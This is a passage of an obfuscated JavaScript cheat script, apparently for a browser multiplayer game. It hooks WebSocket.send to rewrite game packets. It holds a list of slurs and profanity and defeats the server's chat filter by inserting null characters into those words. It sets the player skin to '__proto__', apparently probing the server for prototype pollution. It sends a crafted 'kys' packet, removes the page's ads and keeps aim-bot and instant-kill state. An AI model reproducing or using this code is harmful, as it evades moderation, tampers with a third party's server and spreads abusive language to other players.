HTML.setCSS("\n    .chDiv {\n    position: absolute;\n    left: 0;\n    top: 0;\n    width: 450px;\n    height: 250px;\n    background-color: rgba(34, 34, 34, 0.7);\n    border-radius: 15px;\n    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.8);\n    backdrop-filter: blur(3px);\n}\n\n.chMainDiv {\n    font-family: \"Ubuntu\";\n    font-size: 16px;\n    max-height: 195px;\n    overflow-y: scroll;\n    -webkit-touch-callout: none;\n    -webkit-user-select: none;\n    -khtml-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    overflow-x: hidden;\n    scrollbar-width: thin;\n    scrollbar-color: rgba(255, 255, 255, 0.5) rgba(255, 255, 255, 0.1);\n    border-radius: 10px;\n    padding: 10px;\n}\n\n.chMainDiv::-webkit-scrollbar {\n    width: 8px;\n}\n\n.chMainDiv::-webkit-scrollbar-thumb {\n    background-color: rgba(255, 255, 255, 0.5);\n    border-radius: 10px;\n}\n\n.chMainDiv::-webkit-scrollbar-thumb:hover {\n    background-color: rgba(255, 255, 255, 0.7);\n}\n\n.chMainBox {\n    position: absolute;\n    left: 10px;\n    bottom: 10px;\n    width: 420px;\n    height: 25px;\n    background-color: rgba(255, 255, 255, 0.1);\n    border-radius: 16px;\n    color: rgba(255, 255, 255, 0.75);\n    font-family: \"Courier New\", monospace;\n    font-size: 12px;\n    border: none;\n    outline: none;\n}\n\n\n            ");
HTML.startDiv({
  id: "mChDiv",
  class: "chDiv"
}, _0x21e07d => {
  HTML.addDiv({
    id: "mChMain",
    class: "chMainDiv",
    appendID: "mChDiv"
  }, _0x349771 => {});
  _0x21e07d.text({
    id: "mChBox",
    class: "chMainBox",
    placeHolder: "  click here or press \"Enter\" key to chat"
  });
});
let menuChats = getEl("mChMain");
let menuChatBox = getEl("mChBox");
let menuCBFocus = false;
let menuChCounts = 0;
menuChatBox.value = "";
menuChatBox.addEventListener("focus", () => {
  menuCBFocus = true;
});
menuChatBox.addEventListener("blur", () => {
  menuCBFocus = false;
});
function addMenuChText(_0x486b17, _0x5e9272, _0x3952cf, _0x48f5e8) {
  HTML.set("menuChatDiv");
  _0x3952cf = _0x3952cf || "white";
  let _0x1fc417 = new Date();
  let _0x4c27f7 = _0x1fc417.getMinutes();
  let _0x79bb5e = _0x1fc417.getHours();
  let _0x272383 = "";
  if (!_0x48f5e8) {
    _0x272383 += "<span style=\"color: rgba(255, 255, 255, 0.5)\">" + ((_0x79bb5e < 10 ? "0" : "") + _0x79bb5e) + ":" + ((_0x4c27f7 < 10 ? "0" : "") + _0x4c27f7) + "</span>";
  }
  if (_0x486b17) {
    _0x272383 += "" + ((!_0x48f5e8 ? "<span style='color: gray'> - </span>" : "") + _0x486b17);
  }
  if (_0x5e9272) {
    _0x272383 += (_0x486b17 ? ": " : !_0x48f5e8 ? "<span style='color: gray'> - </span>" : "") + _0x5e9272 + "\n";
  }
  HTML.addDiv({
    id: "menuChDisp",
    style: "color: " + _0x3952cf,
    appendID: "mChMain"
  }, _0x32c873 => {
    _0x32c873.add(_0x272383);
  });
  menuChats.scrollTop = menuChats.scrollHeight;
  menuChCounts++;
}
function chch(_0xc93e9f, _0x428c78, _0x29c65a, _0x1e97e7) {
  HTML.set("menuChatDiv");
  _0x29c65a = _0x29c65a || "white";
  let _0x253d1c = new Date();
  let _0x39ca09 = "";
  if (_0x428c78) {
    _0x39ca09 += (_0xc93e9f ? ": " : !_0x1e97e7 ? "" : "") + _0x428c78 + "\n";
  }
  HTML.addDiv({
    id: "menuChDisp",
    style: "color: " + _0x29c65a,
    appendID: "mChMain"
  }, _0x46c435 => {
    _0x46c435.add(_0x39ca09);
  });
  menuChats.scrollTop = menuChats.scrollHeight;
  menuChCounts++;
}
function resetMenuChText() {
  menuChats.innerHTML = "";
  menuChCounts = 0;
  addMenuChText(null, "", "#72bcd4", 1);
}
resetMenuChText();
let menuIndex = 0;
let menus = ["menuMain", "menuConfig", "menuOther"];
window.changeMenu = function () {
  getEl(menus[menuIndex % menus.length]).style.display = "none";
  menuIndex++;
  getEl(menus[menuIndex % menus.length]).style.display = "block";
};
let mStatus = document.createElement("div");
mStatus.id = "status";
getEl("gameUI").appendChild(mStatus);
HTML.set("status");
HTML.setStyle("\n            display: block;\n            position: absolute;\n            color: #ddd;\n            font: 15px Hammersmith One;\n            top: 5px;\n            left: 720px;\n            ");
HTML.resetHTML();
HTML.setCSS("\n            .sizing {\n                font-size: 15px;\n            }\n            .mod {\n                font-size: 15px;\n                display: inline-block;\n            }\n            ");
HTML.startDiv({
  id: "uehmod",
  class: "sizing"
}, _0x14fdaa => {
  _0x14fdaa.add("Ping: ");
  HTML.addDiv({
    id: "pingFps",
    class: "mod",
    appendID: "uehmod"
  }, _0x45eb41 => {
    _0x45eb41.add("None");
  });
});
let openMenu = false;
let WS = undefined;
let socketID = undefined;
let chatTimeouts = [];
let oldChatter = [];
let chatter = [];
let startedDate = Date.now();
let useWasd = false;
let secPacket = 0;
let secMax = 120;
let secTime = 1000;
let firstSend = {
  sec: false
};
let game = {
  tick: 0,
  tickQueue: [],
  tickBase: function (_0x5348ac, _0x42a85a) {
    if (this.tickQueue[this.tick + _0x42a85a]) {
      this.tickQueue[this.tick + _0x42a85a].push(_0x5348ac);
    } else {
      this.tickQueue[this.tick + _0x42a85a] = [_0x5348ac];
    }
  },
  tickRate: 1000 / config.serverUpdateRate,
  tickSpeed: 0,
  lastTick: performance.now()
};
let dontSend = false;
let fpsTimer = {
  last: 0,
  time: 0,
  ltime: 0
};
let lastMoveDir = undefined;
let lastsp = ["cc", 1, "__proto__"];
WebSocket.prototype.nsend = WebSocket.prototype.send;
WebSocket.prototype.send = function (_0x102a7e) {
  if (!WS) {
    WS = this;
    WS.addEventListener("message", function (_0x4cd1f0) {
      getMessage(_0x4cd1f0);
    });
    WS.addEventListener("close", _0x4ecbef => {
      if (_0x4ecbef.code == 4001) {
        window.location.reload();
      }
    });
  }
  if (WS == this) {
    dontSend = false;
    let _0x363aef = new Uint8Array(_0x102a7e);
    let _0x1fc303 = window.msgpack.decode(_0x363aef);
    let _0x64ce12 = _0x1fc303[0];
    _0x363aef = _0x1fc303[1];
    if (_0x64ce12 == "6") {
      if (_0x363aef[0]) {
        let _0x4f5ca4 = ["cunt", "whore", "fuck", "shit", "faggot", "nigger", "nigga", "dick", "vagina", "minge", "cock", "rape", "cum", "sex", "tits", "penis", "clit", "pussy", "meatcurtain", "jizz", "prune", "douche", "wanker", "damn", "bitch", "dick", "fag", "bastard"];
        let _0x5b2d6d;
        _0x4f5ca4.forEach(_0x33a96e => {
          if (_0x363aef[0].indexOf(_0x33a96e) > -1) {
            _0x5b2d6d = "";
            for (let _0x426016 = 0; _0x426016 < _0x33a96e.length; ++_0x426016) {
              if (_0x426016 == 1) {
                _0x5b2d6d += String.fromCharCode(0);
              }
              _0x5b2d6d += _0x33a96e[_0x426016];
            }
            let _0x52e8e9 = new RegExp(_0x33a96e, "g");
            _0x363aef[0] = _0x363aef[0].replace(_0x52e8e9, _0x5b2d6d);
          }
        });
        _0x363aef[0] = _0x363aef[0].slice(0, 30);
      }
    } else if (_0x64ce12 == "L") {
      _0x363aef[0] = _0x363aef[0] + String.fromCharCode(0).repeat(7);
      _0x363aef[0] = _0x363aef[0].slice(0, 7);
    } else if (_0x64ce12 == "M") {
      _0x363aef[0].name = _0x363aef[0].name == "" ? "unknown" : _0x363aef[0].name;
      _0x363aef[0].moofoll = true;
      _0x363aef[0].skin = _0x363aef[0].skin == 10 ? "__proto__" : _0x363aef[0].skin;
      lastsp = [_0x363aef[0].name, _0x363aef[0].moofoll, _0x363aef[0].skin];
    } else if (_0x64ce12 == "D") {
      if (my.lastDir == _0x363aef[0] || [null, undefined].includes(_0x363aef[0])) {
        dontSend = true;
      } else {
        my.lastDir = _0x363aef[0];
      }
    } else if (_0x64ce12 == "d") {
      if (!_0x363aef[2]) {
        dontSend = true;
      } else if (![null, undefined].includes(_0x363aef[1])) {
        my.lastDir = _0x363aef[1];
      }
    } else if (_0x64ce12 == "K") {
      if (!_0x363aef[1]) {
        dontSend = true;
      }
    } else if (_0x64ce12 == "S") {
      instaC.wait = !instaC.wait;
      dontSend = true;
    } else if (_0x64ce12 == "a") {
      if (_0x363aef[1]) {
        if (player.moveDir == _0x363aef[0]) {
          dontSend = true;
        }
        player.moveDir = _0x363aef[0];
      } else {
        dontSend = true;
      }
    }
    if (!dontSend) {
      let _0x1d05d7 = window.msgpack.encode([_0x64ce12, _0x363aef]);
      this.nsend(_0x1d05d7);
      if (!firstSend.sec) {
        firstSend.sec = true;
        setTimeout(() => {
          firstSend.sec = false;
          secPacket = 0;
        }, secTime);
      }
      secPacket++;
    }
  } else {
    this.nsend(_0x102a7e);
  }
};
function packet(_0x4d147b) {
  let _0x5d4688 = Array.prototype.slice.call(arguments, 1);
  let _0x5a8ee6 = window.msgpack.encode([_0x4d147b, _0x5d4688]);
  WS.send(_0x5a8ee6);
}
function origPacket(_0x3abe5a) {
  let _0x362673 = Array.prototype.slice.call(arguments, 1);
  let _0x33aa0a = window.msgpack.encode([_0x3abe5a, _0x362673]);
  WS.nsend(_0x33aa0a);
}
window.leave = function () {
  origPacket("kys", {
    "frvr is so bad": true,
    "sidney is too good": true,
    "dev are too weak": true
  });
};
let io = {
  send: packet
};
function getMessage(_0x5a2945) {
  let _0x5024bc = new Uint8Array(_0x5a2945.data);
  let _0x5b6863 = window.msgpack.decode(_0x5024bc);
  let _0x2134d5 = _0x5b6863[0];
  _0x5024bc = _0x5b6863[1];
  let _0x29f35f = {
    A: setInitData,
    C: setupGame,
    D: addPlayer,
    E: removePlayer,
    a: updatePlayers,
    G: updateLeaderboard,
    H: loadGameObject,
    I: loadAI,
    J: animateAI,
    K: gatherAnimation,
    L: wiggleGameObject,
    M: shootTurret,
    N: updatePlayerValue,
    O: updateHealth,
    P: killPlayer,
    Q: killObject,
    R: killObjects,
    S: updateItemCounts,
    T: updateAge,
    U: updateUpgrades,
    V: updateItems,
    X: addProjectile,
    2: allianceNotification,
    3: setPlayerTeam,
    4: setAlliancePlayers,
    5: updateStoreItems,
    6: receiveChat,
    7: updateMinimap,
    8: showText,
    9: pingMap,
    0: pingSocketResponse
  };
  if (_0x2134d5 == "io-init") {
    socketID = _0x5024bc[0];
  } else if (_0x29f35f[_0x2134d5]) {
    _0x29f35f[_0x2134d5].apply(undefined, _0x5024bc);
  }
}
Math.lerpAngle = function (_0x4ef127, _0x5a0151, _0x349f7e) {
  let _0x2dccb7 = Math.abs(_0x5a0151 - _0x4ef127);
  if (_0x2dccb7 > Math.PI) {
    if (_0x4ef127 > _0x5a0151) {
      _0x5a0151 += Math.PI * 2;
    } else {
      _0x4ef127 += Math.PI * 2;
    }
  }
  let _0xb45a55 = _0x5a0151 + (_0x4ef127 - _0x5a0151) * _0x349f7e;
  if (_0xb45a55 >= 0 && _0xb45a55 <= Math.PI * 2) {
    return _0xb45a55;
  }
  return _0xb45a55 % (Math.PI * 2);
};
CanvasRenderingContext2D.prototype.roundRect = function (_0x173392, _0x560ea7, _0x244c50, _0x3b5f7e, _0x3e5187) {
  if (_0x244c50 < _0x3e5187 * 2) {
    _0x3e5187 = _0x244c50 / 2;
  }
  if (_0x3b5f7e < _0x3e5187 * 2) {
    _0x3e5187 = _0x3b5f7e / 2;
  }
  if (_0x3e5187 < 0) {
    _0x3e5187 = 0;
  }
  this.beginPath();
  this.moveTo(_0x173392 + _0x3e5187, _0x560ea7);
  this.arcTo(_0x173392 + _0x244c50, _0x560ea7, _0x173392 + _0x244c50, _0x560ea7 + _0x3b5f7e, _0x3e5187);
  this.arcTo(_0x173392 + _0x244c50, _0x560ea7 + _0x3b5f7e, _0x173392, _0x560ea7 + _0x3b5f7e, _0x3e5187);
  this.arcTo(_0x173392, _0x560ea7 + _0x3b5f7e, _0x173392, _0x560ea7, _0x3e5187);
  this.arcTo(_0x173392, _0x560ea7, _0x173392 + _0x244c50, _0x560ea7, _0x3e5187);
  this.closePath();
  return this;
};
function resetMoveDir() {
  keys = {};
  io.send("e");
}
let antiSync = false;
let allChats = [];
let ais = [];
let petals = [];
let players = [];
let alliances = [];
let alliancePlayers = [];
let gameObjects = [];
let liztobj = [];
let projectiles = [];
let deadPlayers = [];
let breakObjects = [];
let player;
let playerSID;
let tmpObj;
let enemy = [];
let nears = [];
let near = [];
let rKeyPressed = false;
let my = {
  reloaded: false,
  waitHit: 0,
  autoAim: false,
  revAim: false,
  ageInsta: true,
  reSync: false,
  bullTick: 0,
  anti0Tick: 0,
  antiSync: false,
  safePrimary: function (_0x48fd29) {
    return [0, 8].includes(_0x48fd29.primaryIndex);
  },
  safeSecondary: function (_0x41bf3a) {
    return [10, 11, 14].includes(_0x41bf3a.secondaryIndex);
  },
  lastDir: 0,
  autoPush: false,
  pushData: {}
};
function findID(_0x3476f, _0x3d20bc) {
  return _0x3476f.find(_0x4e6281 => _0x4e6281.id == _0x3d20bc);
}
function findSID(_0x58affa, _0x4e5727) {
  return _0x58affa.find(_0x4c97ee => _0x4c97ee.sid == _0x4e5727);
}
function findPlayerByID(_0x477644) {
  return findID(players, _0x477644);
}
function findPlayerBySID(_0xb16caf) {
  return findSID(players, _0xb16caf);
}
function findAIBySID(_0x15ee45) {
  return findSID(ais, _0x15ee45);
}
function findObjectBySid(_0x5dc86e) {
  return findSID(gameObjects, _0x5dc86e);
}
function findProjectileBySid(_0x13ad90) {
  return findSID(gameObjects, _0x13ad90);
}
let adCard = getEl("adCard");
adCard.remove();
let promoImageHolder = getEl("promoImgHolder");
promoImageHolder.remove();
let chatButton = getEl("chatButton");
chatButton.remove();
let gameCanvas = getEl("gameCanvas");
let mainContext = gameCanvas.getContext("2d");
let mapDisplay = getEl("mapDisplay");
let mapContext = mapDisplay.getContext("2d");
mapDisplay.width = 300;
mapDisplay.height = 300;
let storeMenu = getEl("storeMenu");
let storeHolder = getEl("storeHolder");
let upgradeHolder = getEl("upgradeHolder");
let upgradeCounter = getEl("upgradeCounter");
let chatBox = getEl("chatBox");
chatBox.autocomplete = "off";
chatBox.style.textAlign = "center";
chatBox.style.width = "18em";
let chatHolder = getEl("chatHolder");
let actionBar = getEl("actionBar");
let leaderboardData = getEl("leaderboardData");
let itemInfoHolder = getEl("itemInfoHolder");
let menuCardHolder = getEl("menuCardHolder");
let mainMenu = getEl("mainMenu");
let diedText = getEl("diedText");
let screenWidth;
let screenHeight;
let maxScreenWidth = config.maxScreenWidth * parseFloat(getEl("vision").value);
let maxScreenHeight = config.maxScreenHeight * parseFloat(getEl("vision").value);
function zoomVision() {
  if (maxScreenWidth != config.maxScreenWidth * 1.5 || maxScreenHeight != config.maxScreenHeight * 1.5) {
    maxScreenWidth = config.maxScreenWidth * 1.5;
    maxScreenHeight = config.maxScreenHeight * 1.5;
    resize();
  }
}
function resetZoom() {
  if (maxScreenWidth != config.maxScreenWidth * parseFloat(getEl("vision").value) || maxScreenHeight != config.maxScreenHeight * parseFloat(getEl("vision").value)) {
    maxScreenWidth = config.maxScreenWidth * parseFloat(getEl("vision").value);
    maxScreenHeight = config.maxScreenHeight * parseFloat(getEl("vision").value);
    resize();
  }
}
getEl("vision").onchange = function () {
  resetZoom();
};
let pixelDensity = 1;
let delta;
let now;
let lastUpdate = performance.now();
let camX;
let camY;
let tmpDir;
let mouseX = 0;
let mouseY = 0;
let allianceMenu = getEl("allianceMenu");
let waterMult = 1;
let waterPlus = 0;
let outlineColor = "#525252";
let darkOutlineColor = "#3d3f42";
let outlineWidth = 5.5;
let firstSetup = true;
let keys = {};
let moveKeys = {
  87: [0, -1],
  38: [0, -1],
  83: [0, 1],
  40: [0, 1],
  65: [-1, 0],
  37: [-1, 0],
  68: [1, 0],
  39: [1, 0]
};
let attackState = 0;
let inGame = false;
let macro = {};
let mills = {
  place: 0,
  placeSpawnPads: 0
};
let lastDir;
let lastLeaderboardData = [];
let inWindow = true;
window.onblur = function () {
  inWindow = false;
};
window.onfocus = function () {
  inWindow = true;
  if (player && player.alive) {}
};
let ms = {
  avg: 0,
  max: 0,
  min: 0,
  delay: 0
};
function pingSocketResponse() {
  let _0x1c1c2c = window.pingTime;
  const _0x57f5f6 = document.getElementById("pingDisplay");
  _0x57f5f6.innerText = "Ping: " + _0x1c1c2c + " ms`";
  if (_0x1c1c2c > ms.max || isNaN(ms.max)) {
    ms.max = _0x1c1c2c;
  }
  if (_0x1c1c2c < ms.min || isNaN(ms.min)) {
    ms.min = _0x1c1c2c;
  }
}
let placeVisible = [];
class Utils {
  constructor() {
    let _0x407814 = Math.abs;
    let _0x3a1835 = Math.cos;
    let _0x25e4e9 = Math.sin;
    let _0x32000d = Math.pow;
    let _0xa2047b = Math.sqrt;
    let _0x5ab235 = Math.atan2;
    let _0x2424f6 = Math.PI;
    let _0x1eb3d1 = this;
    this.round = function (_0x30578c, _0x4d86c5) {
      return Math.round(_0x30578c * _0x4d86c5) / _0x4d86c5;
    };
    this.toRad = function (_0x36d322) {
      return _0x36d322 * (_0x2424f6 / 180);
    };
    this.toAng = function (_0x590541) {
      return _0x590541 / (_0x2424f6 / 180);
    };
    this.randInt = function (_0x3bcea0, _0x223742) {
      return Math.floor(Math.random() * (_0x223742 - _0x3bcea0 + 1)) + _0x3bcea0;
    };
    this.randFloat = function (_0x41e5d3, _0x2ef08d) {
      return Math.random() * (_0x2ef08d - _0x41e5d3 + 1) + _0x41e5d3;
    };
    this.lerp = function (_0x2a20ee, _0x217b0d, _0x38574d) {
      return _0x2a20ee + (_0x217b0d - _0x2a20ee) * _0x38574d;
    };
    this.decel = function (_0x39a378, _0x80d7a9) {
      if (_0x39a378 > 0) {
        _0x39a378 = Math.max(0, _0x39a378 - _0x80d7a9);
      } else if (_0x39a378 < 0) {
        _0x39a378 = Math.min(0, _0x39a378 + _0x80d7a9);
      }
      return _0x39a378;
    };
    this.getDistance = function (_0x245a17, _0x23bd96, _0x35307b, _0x311111) {
      return _0xa2047b((_0x35307b -= _0x245a17) * _0x35307b + (_0x311111 -= _0x23bd96) * _0x311111);
    };
    this.getDist = function (_0x39aad8, _0x14733e, _0x41147c, _0x279655) {
      let _0xa473e0 = {
        x: _0x41147c == 0 ? _0x39aad8.x : _0x41147c == 1 ? _0x39aad8.x1 : _0x41147c == 2 ? _0x39aad8.x2 : _0x41147c == 3 && _0x39aad8.x3,
        y: _0x41147c == 0 ? _0x39aad8.y : _0x41147c == 1 ? _0x39aad8.y1 : _0x41147c == 2 ? _0x39aad8.y2 : _0x41147c == 3 && _0x39aad8.y3
      };
      let _0x376e15 = {
        x: _0x279655 == 0 ? _0x14733e.x : _0x279655 == 1 ? _0x14733e.x1 : _0x279655 == 2 ? _0x14733e.x2 : _0x279655 == 3 && _0x14733e.x3,
        y: _0x279655 == 0 ? _0x14733e.y : _0x279655 == 1 ? _0x14733e.y1 : _0x279655 == 2 ? _0x14733e.y2 : _0x279655 == 3 && _0x14733e.y3
      };
      return _0xa2047b((_0x376e15.x -= _0xa473e0.x) * _0x376e15.x + (_0x376e15.y -= _0xa473e0.y) * _0x376e15.y);
    };
    this.getDirection = function (_0x2fc575, _0x1c932f, _0x1ec6a2, _0x467004) {
      return _0x5ab235(_0x1c932f - _0x467004, _0x2fc575 - _0x1ec6a2);
    };
    this.getDirect = function (_0x5cf626, _0x520bdc, _0x49d1f8, _0x47bbeb) {
      let _0x15dee5 = {
        x: _0x49d1f8 == 0 ? _0x5cf626.x : _0x49d1f8 == 1 ? _0x5cf626.x1 : _0x49d1f8 == 2 ? _0x5cf626.x2 : _0x49d1f8 == 3 && _0x5cf626.x3,
        y: _0x49d1f8 == 0 ? _0x5cf626.y : _0x49d1f8 == 1 ? _0x5cf626.y1 : _0x49d1f8 == 2 ? _0x5cf626.y2 : _0x49d1f8 == 3 && _0x5cf626.y3
      };
      let _0x13945a = {
        x: _0x47bbeb == 0 ? _0x520bdc.x : _0x47bbeb == 1 ? _0x520bdc.x1 : _0x47bbeb == 2 ? _0x520bdc.x2 : _0x47bbeb == 3 && _0x520bdc.x3,
        y: _0x47bbeb == 0 ? _0x520bdc.y : _0x47bbeb == 1 ? _0x520bdc.y1 : _0x47bbeb == 2 ? _0x520bdc.y2 : _0x47bbeb == 3 && _0x520bdc.y3
      };
      return _0x5ab235(_0x15dee5.y - _0x13945a.y, _0x15dee5.x - _0x13945a.x);
    };
    this.getAngleDist = function (_0x3c7bc1, _0x49ceae) {
      let _0x59a6da = _0x407814(_0x49ceae - _0x3c7bc1) % (_0x2424f6 * 2);
      if (_0x59a6da > _0x2424f6) {
        return _0x2424f6 * 2 - _0x59a6da;
      } else {
        return _0x59a6da;
      }
    };
    this.isNumber = function (_0x544db1) {
      return typeof _0x544db1 == "number" && !isNaN(_0x544db1) && isFinite(_0x544db1);
    };
    this.isString = function (_0x4d2136) {
      return _0x4d2136 && typeof _0x4d2136 == "string";
    };
    this.kFormat = function (_0x470e87) {
      if (_0x470e87 > 999) {
        return (_0x470e87 / 1000).toFixed(1) + "k";
      } else {
        return _0x470e87;
      }
    };
    this.sFormat = function (_0x4fcfac) {
      let _0x242315 = [{
        num: 1000,
        string: "k"
      }, {
        num: 1000000,
        string: "m"
      }, {
        num: 1000000000,
        string: "b"
      }, {
        num: 1000000000000,
        string: "q"
      }].reverse();
      let _0x49ed18 = _0x242315.find(_0x51ff9e => _0x4fcfac >= _0x51ff9e.num);
      if (!_0x49ed18) {
        return _0x4fcfac;
      }
      return (_0x4fcfac / _0x49ed18.num).toFixed(1) + _0x49ed18.string;
    };
    this.capitalizeFirst = function (_0x5495e4) {
      return _0x5495e4.charAt(0).toUpperCase() + _0x5495e4.slice(1);
    };
    this.fixTo = function (_0x77f069, _0x543667) {
      return parseFloat(_0x77f069.toFixed(_0x543667));
    };
    this.sortByPoints = function (_0x4b6c26, _0x557507) {
      return parseFloat(_0x557507.points) - parseFloat(_0x4b6c26.points);
    };
    this.lineInRect = function (_0x529f66, _0x248627, _0x477563, _0xc6b528, _0xbbb2d1, _0x29e8c0, _0x3d74a4, _0x218adb) {
      let _0x3697ed = _0xbbb2d1;
      let _0x413b2e = _0x3d74a4;
      if (_0xbbb2d1 > _0x3d74a4) {
        _0x3697ed = _0x3d74a4;
        _0x413b2e = _0xbbb2d1;
      }
      if (_0x413b2e > _0x477563) {
        _0x413b2e = _0x477563;
      }
      if (_0x3697ed < _0x529f66) {
        _0x3697ed = _0x529f66;
      }
      if (_0x3697ed > _0x413b2e) {
        return false;
      }
      let _0x3b8183 = _0x29e8c0;
      let _0x29acac = _0x218adb;
      let _0x737d1a = _0x3d74a4 - _0xbbb2d1;
      if (Math.abs(_0x737d1a) > 1e-7) {
        let _0x2e9584 = (_0x218adb - _0x29e8c0) / _0x737d1a;
        let _0x1fd070 = _0x29e8c0 - _0x2e9584 * _0xbbb2d1;
        _0x3b8183 = _0x2e9584 * _0x3697ed + _0x1fd070;
        _0x29acac = _0x2e9584 * _0x413b2e + _0x1fd070;
      }
      if (_0x3b8183 > _0x29acac) {
        let _0x48507f = _0x29acac;
        _0x29acac = _0x3b8183;
        _0x3b8183 = _0x48507f;
      }
      if (_0x29acac > _0xc6b528) {
        _0x29acac = _0xc6b528;
      }
      if (_0x3b8183 < _0x248627) {
        _0x3b8183 = _0x248627;
      }
      if (_0x3b8183 > _0x29acac) {
        return false;
      }
      return true;
    };
    this.containsPoint = function (_0x292b14, _0x17b183, _0x15b500) {
      let _0x1fca42 = _0x292b14.getBoundingClientRect();
      let _0x46db7f = _0x1fca42.left + window.scrollX;
      let _0x1542aa = _0x1fca42.top + window.scrollY;
      let _0x8df790 = _0x1fca42.width;
      let _0x579e30 = _0x1fca42.height;
      let _0x16afc4 = _0x17b183 > _0x46db7f && _0x17b183 < _0x46db7f + _0x8df790;
      let _0x198935 = _0x15b500 > _0x1542aa && _0x15b500 < _0x1542aa + _0x579e30;
      return _0x16afc4 && _0x198935;
    };
    this.mousifyTouchEvent = function (_0x5aa225) {
      let _0x12cc0f = _0x5aa225.changedTouches[0];
      _0x5aa225.screenX = _0x12cc0f.screenX;
      _0x5aa225.screenY = _0x12cc0f.screenY;
      _0x5aa225.clientX = _0x12cc0f.clientX;
      _0x5aa225.clientY = _0x12cc0f.clientY;
      _0x5aa225.pageX = _0x12cc0f.pageX;
      _0x5aa225.pageY = _0x12cc0f.pageY;
    };
    this.hookTouchEvents = function (_0x38faf8, _0x1e0d34) {
      let _0x9e97df = !_0x1e0d34;
      let _0x5b55b0 = false;
      let _0x45b7dd = false;
      _0x38faf8.addEventListener("touchstart", this.checkTrusted(_0x204c29), _0x45b7dd);
      _0x38faf8.addEventListener("touchmove", this.checkTrusted(_0x338ab1), _0x45b7dd);
      _0x38faf8.addEventListener("touchend", this.checkTrusted(_0xd36522), _0x45b7dd);
      _0x38faf8.addEventListener("touchcancel", this.checkTrusted(_0xd36522), _0x45b7dd);
      _0x38faf8.addEventListener("touchleave", this.checkTrusted(_0xd36522), _0x45b7dd);
      function _0x204c29(_0x2ac4a5) {
        _0x1eb3d1.mousifyTouchEvent(_0x2ac4a5);
        window.setUsingTouch(true);
        if (_0x9e97df) {
          _0x2ac4a5.preventDefault();
          _0x2ac4a5.stopPropagation();
        }
        if (_0x38faf8.onmouseover) {
          _0x38faf8.onmouseover(_0x2ac4a5);
        }
        _0x5b55b0 = true;
      }
      function _0x338ab1(_0x126adb) {
        _0x1eb3d1.mousifyTouchEvent(_0x126adb);
        window.setUsingTouch(true);
        if (_0x9e97df) {
          _0x126adb.preventDefault();
          _0x126adb.stopPropagation();
        }
        if (_0x1eb3d1.containsPoint(_0x38faf8, _0x126adb.pageX, _0x126adb.pageY)) {
          if (!_0x5b55b0) {
            if (_0x38faf8.onmouseover) {
              _0x38faf8.onmouseover(_0x126adb);
            }
            _0x5b55b0 = true;
          }
        } else if (_0x5b55b0) {
          if (_0x38faf8.onmouseout) {
            _0x38faf8.onmouseout(_0x126adb);
          }
          _0x5b55b0 = false;
        }
      }
      function _0xd36522(_0xc4cd8e) {
        _0x1eb3d1.mousifyTouchEvent(_0xc4cd8e);
        window.setUsingTouch(true);
        if (_0x9e97df) {
          _0xc4cd8e.preventDefault();
          _0xc4cd8e.stopPropagation();
        }
        if (_0x5b55b0) {
          if (_0x38faf8.onclick) {
            _0x38faf8.onclick(_0xc4cd8e);
          }
          if (_0x38faf8.onmouseout) {
            _0x38faf8.onmouseout(_0xc4cd8e);
          }
          _0x5b55b0 = false;
        }
      }
    };
    this.removeAllChildren = function (_0x2febff) {
      while (_0x2febff.hasChildNodes()) {
        _0x2febff.removeChild(_0x2febff.lastChild);
      }
    };
    this.generateElement = function (_0x4e5686) {
      let _0xc7d6b6 = document.createElement(_0x4e5686.tag || "div");
      function _0x17aa5f(_0x1dae73, _0x4d3624) {
        if (_0x4e5686[_0x1dae73]) {
          _0xc7d6b6[_0x4d3624] = _0x4e5686[_0x1dae73];
        }
      }
      _0x17aa5f("text", "textContent");
      _0x17aa5f("html", "innerHTML");
      _0x17aa5f("class", "className");
      for (let _0x17a336 in _0x4e5686) {
        switch (_0x17a336) {
          case "tag":
          case "text":
          case "html":
          case "class":
          case "style":
          case "hookTouch":
          case "parent":
          case "children":
            continue;
          default:
            break;
        }
        _0xc7d6b6[_0x17a336] = _0x4e5686[_0x17a336];
      }
      if (_0xc7d6b6.onclick) {
        _0xc7d6b6.onclick = this.checkTrusted(_0xc7d6b6.onclick);
      }
      if (_0xc7d6b6.onmouseover) {
        _0xc7d6b6.onmouseover = this.checkTrusted(_0xc7d6b6.onmouseover);
      }
      if (_0xc7d6b6.onmouseout) {
        _0xc7d6b6.onmouseout = this.checkTrusted(_0xc7d6b6.onmouseout);
      }
      if (_0x4e5686.style) {
        _0xc7d6b6.style.cssText = _0x4e5686.style;
      }
      if (_0x4e5686.hookTouch) {
        this.hookTouchEvents(_0xc7d6b6);
      }
      if (_0x4e5686.parent) {
        _0x4e5686.parent.appendChild(_0xc7d6b6);
      }
      if (_0x4e5686.children) {
        for (let _0x414f41 = 0; _0x414f41 < _0x4e5686.children.length; _0x414f41++) {
          _0xc7d6b6.appendChild(_0x4e5686.children[_0x414f41]);
        }
      }
      return _0xc7d6b6;
    };
    this.checkTrusted = function (_0x35aea9) {
      return function (_0x13d4ef) {
        if (_0x13d4ef && _0x13d4ef instanceof Event && (_0x13d4ef && typeof _0x13d4ef.isTrusted == "boolean" ? _0x13d4ef.isTrusted : true)) {
          _0x35aea9(_0x13d4ef);
        } else {}
      };
    };
    this.randomString = function (_0x36627d) {
      let _0x50aee4 = "";
      let _0x1a89c3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (let _0x281c38 = 0; _0x281c38 < _0x36627d; _0x281c38++) {
        _0x50aee4 += _0x1a89c3.charAt(Math.floor(Math.random() * _0x1a89c3.length));
      }
      return _0x50aee4;
    };
    this.countInArray = function (_0x425b8d, _0x5e5e93) {
      let _0x57a476 = 0;
      for (let _0x418835 = 0; _0x418835 < _0x425b8d.length; _0x418835++) {
        if (_0x425b8d[_0x418835] === _0x5e5e93) {
          _0x57a476++;
        }
      }
      return _0x57a476;
    };
    this.hexToRgb = function (_0x3895f7) {
      return _0x3895f7.slice(1).match(/.{1,2}/g).map(_0x180525 => parseInt(_0x180525, 16));
    };
    this.getRgb = function (_0x1546bc, _0x2b11a6, _0x19f0de) {
      return [_0x1546bc / 255, _0x2b11a6 / 255, _0x19f0de / 255].join(", ");
    };
  }
}
;
class Animtext {
  constructor() {
    this.init = function (_0x2fdf03, _0x488152, _0x23a150, _0x4f5c30, _0x479262, _0xa932de, _0x3a7ec2) {
      this.x = _0x2fdf03;
      this.y = _0x488152;
